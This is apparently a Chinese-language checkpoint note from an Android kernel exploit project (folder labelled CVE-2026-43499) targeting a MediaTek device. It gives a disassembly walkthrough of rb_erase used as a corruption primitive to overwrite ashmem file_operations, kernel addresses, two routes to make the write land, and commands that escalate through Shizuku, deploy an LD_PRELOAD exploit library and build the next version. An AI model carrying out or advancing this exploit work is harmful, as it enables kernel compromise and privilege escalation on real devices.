# CHECKPOINT — v28 rb_erase 完整分析 & 突破路线

> 时间: 2026-07-15
> 文件: preload_mtk_v28_fix2.so (MD5: b2ee495504a73edfe9b848d3c1b319d0)
> 状态: SLIDE/FOPS 稳定，GhostLock race 触发，FOPS 未覆写

---

## 1. rb_erase 反汇编结论 (0xffffffc008a71228)

### rb_node 结构体
```
+0x00: __rb_parent_color
+0x08: rb_right
+0x10: rb_left
```

### Path C short-circuit (successor->rb_left == NULL)
当前 v28 Path C: tree_left=非零, tree_right=page_base+0x3000 (=SCRATCH_OFF),
fake rb_node at SCRATCH_OFF: [+0x00]=FOPS-8|RED, [+0x08]=fake_fops, [+0x10]=0

```
0x71238: ldr x11, [x8, #0x10]   // successor->rb_left = 0 → cbz→0x712dc
0x712dc: ldr x11, [x8, #0x8]    // x11 = successor->rb_right = fake_fops
0x712e0: mov x9, x8              // x9 = successor (=page_base+0x3000)
0x712e4: ldr x10, [x0, #0x10]   // x10 = node->rb_left = tree_left = fake_fops
0x712e8: str x10, [x9, #0x10]   // successor->rb_left = fake_fops
0x712f8: str x12, [x10]         // *(fake_fops+0x00) = successor|color   ← 破坏 fops.owner
0x712fc: ldr x12, [x0]          // x12 = tree_pc = OFF|RED
0x71300: ands x10, x12, #~3     // x10 = parent = OFF
0x71308: ldr x13, [x10, #0x10]! // x13 = *(OFF+0x10) = *(FOPS) = ashmem_fops.owner
0x7130c: sub x14, x10, #8       // x14 = OFF+0x08 = FOPS-8
0x71310: cmp x13, x0            // ashmem_fops.owner ≠ waiter_stack_addr
0x71314: csel x10, x10, x14, eq // → x10 = FOPS-8 (rb_right分支)
0x71318: str x9, [x10]          // ★ [FOPS-8] = successor = page_base+0x3000
```

**结论**: csel 永远走 rb_right → 写 parent+0x08。parent=OFF → 写 FOPS-8。差8字节。

---

## 2. 三调用点状态

| 调用 | 地址 | 节点来源 | rb_node | parent来源 | 执行？ |
|------|------|---------|---------|-----------|--------|
| Call 1 | 0x1eb328 | lock->waiters | tree_entry (words 0-2) | tree_pc | ✅ |
| Call 2 | 0x1eb8f8 | pi_waiters | pi_tree_entry (words 3-5) | pi_parent | ❌ |
| Call 3 | 0x1ebedc | pi_waiters | pi_tree_entry (words 3-5) | pi_parent | ❌ |

Call 2/3 不执行原因: owner->pi_blocked_on == NULL (链只有一层深度)。

### Call 1 (唯一执行)
- 用 tree_entry (fd_set words 0-2)
- tree_pc = OFF|RED → parent=OFF → parent+0x08=FOPS-8 ❌
- 如果 tree_pc = FOPS-8|RED → parent=FOPS-8 → parent+0x08=FOPS ✅
- 但 LESSONS 记录: tree_pc=FOPS-8 不触发 (v22 ret=0)

### Call 2/3 (如果执行)
- pi_parent 已设为 FOPS-8|RED (v27_pi_pc)
- pi_left=0 (Path A) → rb_erase 写 node->rb_right(=fake_fops) 到 parent+0x08=FOPS ✅
- 需要突破: 让 PI chain 深度≥2, 且 waiter->lock 检查通过

---

## 3. 两条突破路线

### 路线 A: PSELECT_V23_ALT=1 (5分钟测试)
```
PSELECT_V23_ALT=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10
```
- 设 tree_pc = alt_pc = FOPS-8|RED (0xffffff80028e76e1，**带RED位**)
- Path A (tree_left=0, tree_right=fake_fops)
- rb_erase 写 node->rb_right(=fake_fops) 到 parent+0x08=FOPS
- **v22 失败原因**: 用的是 FOPS-8 无 RED 位 (0xffffff80028e76e0)。当前代码的 alt_pc 有 |1ULL，从未测过。

### 路线 B: 深度 PI chain (改源码)
- 让 owner 也阻塞在另一个 PI mutex → owner->pi_blocked_on != NULL
- rt_mutex_adjust_prio_chain 走多级链 → Call 2/3 执行
- Call 2 用 pi_tree_entry (pi_parent=FOPS-8|RED, Path A) → 写 fake_fops 到 FOPS
- 方案: 三线程 (C持有lock_C → owner持有f_pi_target+阻塞在lock_C → waiter阻塞在f_pi_target)
- 需处理: waiter->lock 检查、死锁检测(-EDEADLK)、时序

---

## 4. 关键地址 (不变)

```
ASHMEM_MISC_OFF:  0xffffff80028e76d8  (name|RED = 0xffffff80028e76d9, 当前tree_pc)
ASHMEM_MISC_FOPS: 0xffffff80028e76e8  (FOPS, 覆写目标)
FOPS-8:           0xffffff80028e76e0  (FOPS-8|RED = 0xffffff80028e76e1, alt_pc)
KIMAGE_TEXT_BASE: 0xffffffc008000000
```

## 5. 运行命令

```bash
# 通过 Shizuku 提权
RISH_APPLICATION_ID=com.termux /system/bin/app_process -Djava.class.path=/data/local/tmp/rish_shizuku.dex /system/bin --nice-name=rish rikka.shizuku.shell.ShizukuShellLoader

# 部署
cp /sdcard/Documents/matisse_backup_essentials/preload_mtk_v28_fix2.so /data/local/tmp/preload.so

# 路线A测试
PSELECT_V23_ALT=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10 2>&1

# 编译
cd /mnt/sdcard/Documents/matisse_backup_essentials/CyberMeowfia/IonStack/CVE-2026-43499/exploit
make PROJECT=matisse-OS2.0.6.0.ULKCNXM API=34 CC=clang
cp build/matisse-OS2.0.6.0.ULKCNXM/bin/preload.so /sdcard/Documents/matisse_backup_essentials/preload_mtk_v29.so
```
